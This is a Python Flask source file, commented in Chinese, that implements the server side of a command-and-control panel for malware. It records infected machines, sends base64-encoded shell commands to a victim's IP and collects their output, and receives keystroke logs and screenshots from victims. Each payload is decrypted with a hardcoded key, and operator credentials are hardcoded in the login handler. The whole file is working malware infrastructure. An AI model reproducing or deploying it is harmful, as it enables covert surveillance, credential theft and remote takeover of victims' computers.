# -*- coding:utf-8 -*-
"""
作者：shinian
创建日期：2024/5/24 22:01
"""

# stage/handlers.py

import base64  # 导入base64编解码模块
import json  # 导入JSON处理模块
import os  # 导入操作系统模块

import requests  # 导入HTTP请求模块
from flask import request, redirect, url_for, render_template, flash  # 导入Flask模块中的相关功能
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user

from .aes_utils import decrypt  # 从aes_utils模块导入解密函数

# 获取当前文件所在目录
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
# 拼接文件路径，指向存储PC信息的JSON文件
PCINFO_FILE_PATH = os.path.join(CURRENT_DIR, '..', 'data/pcinfo.json')

# 配置 Flask-Login
login_manager = LoginManager()
login_manager.login_view = 'login'  # 配置登录视图


# 用户类
class User(UserMixin):
    def __init__(self, id):
        self.id = id  # 初始化用户ID


@login_manager.user_loader
def load_user(user_id):
    return User(user_id)  # 加载用户实例


def login():
    if request.method == 'POST':
        username = request.form['username']  # 获取表单中的用户名
        password = request.form['password']  # 获取表单中的密码
        if username == 'ginkgo' and password == 'Mima123456':  # 验证用户名和密码
            user = User(username)  # 创建用户实例
            login_user(user)  # 登录用户
            flash('登录成功', 'success')  # 显示成功消息
            return redirect(url_for('index'))  # 重定向到首页
        else:
            flash('用户名或密码错误', 'danger')  # 显示错误消息
    return render_template('login.html')  # 渲染登录页面


def logout():
    logout_user()  # 登出用户
    return redirect(url_for('login'))  # 重定向到登录页面


@login_required
def index():
    return render_template('index.html')  # 渲染首页


@login_required
def get_pcinfo():
    try:
        with open(PCINFO_FILE_PATH, 'r') as json_file:
            pcinfo = json.load(json_file)  # 读取PC信息
    except (FileNotFoundError, json.decoder.JSONDecodeError):
        pcinfo = []  # 如果文件不存在或解析错误，则返回空列表
    return json.dumps(pcinfo)  # 返回PC信息的JSON字符串


def save_info():
    """
    处理保存PC信息的请求，将接收到的加密数据解密后保存到JSON文件中。
    """
    encrypted_data = request.data  # 获取请求中的加密数据
    de_new_pcinfo = decrypt(encrypted_data, "dGhpc2lzbXlpdGVt")  # 解密数据
    json_info = json.loads(de_new_pcinfo)  # 将解密后的数据解析为JSON
    uid = json_info['UID']  # 获取用户ID
    mac = json_info['MAC']  # 获取MAC地址
    client_ip = request.remote_addr  # 获取客户端IP地址

    pcinfo = {'UID': uid, 'IP': client_ip, 'MAC': mac}  # 构造PC信息字典
    print(f"Received data: {pcinfo}")  # 打印接收到的数据

    try:
        with open(PCINFO_FILE_PATH, 'r') as json_file:
            pcinfo_list = json.load(json_file)  # 读取现有的PC信息列表
    except (FileNotFoundError, json.decoder.JSONDecodeError):
        pcinfo_list = []  # 如果文件不存在或解析错误，则初始化为空列表

    for item in pcinfo_list:
        if item['UID'] == uid and item['MAC'] == mac:  # 检查是否已有相同UID和MAC的条目
            item['IP'] = client_ip  # 更新IP地址
            break
    else:
        pcinfo_list.append(pcinfo)  # 如果没有相同条目，则添加新的PC信息

    with open(PCINFO_FILE_PATH, 'w') as json_file:
        json.dump(pcinfo_list, json_file)  # 将更新后的PC信息列表写回文件

    return redirect(url_for('print_info'))  # 重定向到打印PC信息的页面


@login_required
def print_info():
    """
    处理打印PC信息的请求，读取JSON文件中的PC信息并返回给模板进行展示。
    """
    try:
        with open(PCINFO_FILE_PATH, 'r') as file:
            pcinfo = json.load(file)  # 读取PC信息
    except FileNotFoundError:
        print("FileNotFoundError: The JSON file could not be found.")
        pcinfo = []  # 如果文件不存在，则返回空列表

    print("Loaded PC info:", pcinfo)  # 添加调试语句，查看加载的PC信息

    return render_template('list.html', data=pcinfo)  # 渲染PC信息列表页面


def activate():
    """
    处理激活请求，执行客户端指定的命令并返回结果。
    """
    ip = request.form.get('ip')  # 获取表单中的IP地址
    cmd = request.form.get('command')  # 获取表单中的命令
    if ip and cmd:
        with open('data/result.txt', 'w') as f:
            f.write('')  # 清空结果文件
        en_cmd = base64.b64encode(cmd.encode('utf-8')).decode('utf-8')  # 对命令进行Base64编码
        # 发送请求
        requests.get(f'http://{ip}/cmd/{en_cmd}')
        # print(en_cmd)
        return redirect(url_for('result', ip=ip))  # 重定向到结果页面
    else:
        return "IP or command is missing."  # 返回错误信息


def result():
    """
    处理结果请求，将结果写入文件并重定向到打印结果页面。
    """
    if request.method == 'POST':
        with open('data/result.txt', 'ab') as f:
            result = request.form['result']
            f.write(result.encode('utf-8'))  # 将结果写入文件
    ip = request.args.get('ip')
    return redirect(url_for('print_result', ip=ip))  # 重定向到打印结果的页面


@login_required
def print_result(ip):
    """
    处理打印结果请求，读取结果文件并返回给模板进行展示。
    """
    with open('data/result.txt', 'rb') as f:
        content = f.read()  # 读取结果文件内容
        de_content = decrypt(content, "dGhpc2lzbXlpdGVt")  # 解密文件内容
        de_content_str = base64.b64decode(de_content)  # Base64解码
    return render_template('result.html', content=de_content_str.decode('utf-8'), ip=ip)  # 渲染结果页面


def keylogger():
    try:
        # 获取表单数据
        ID = request.form['id']
        raw_keylog = request.form['keylog']
        # 解密密钥日志
        de_keylog = decrypt(raw_keylog.encode('utf-8'), 'dGhpc2lzbXlpdGVt')
        # Base64解码并转换为字符串
        de_base64_keylog = base64.b64decode(de_keylog).decode('utf-8')
        # 确保目录存在
        os.makedirs('data/monitor/keylog', exist_ok=True)
        # 将解码后的日志写入文件，指定编码为utf-8
        with open(f'data/monitor/keylog/{ID}.txt', 'a', encoding='utf-8') as fp:
            fp.write(de_base64_keylog + '\n')
        return 'keylogger received', 200
    except Exception as e:
        print(f"Error processing keylog: {e}")
        return 'Error', 500


def screenshotter():
    ID = request.form['id']  # 获取表单中的ID
    raw_img = request.form['img']  # 获取表单中的图片
    de_img = decrypt(raw_img, 'dGhpc2lzbXlpdGVt')  # 解密图片数据
    de_base64_img = base64.b64decode(de_img)  # Base64解码
    with open(f'data/monitor/screenshot/{ID}.jpg', 'wb') as fp:
        fp.write(de_base64_img)  # 将解码后的图片数据写入文件
    return 'screenshot'
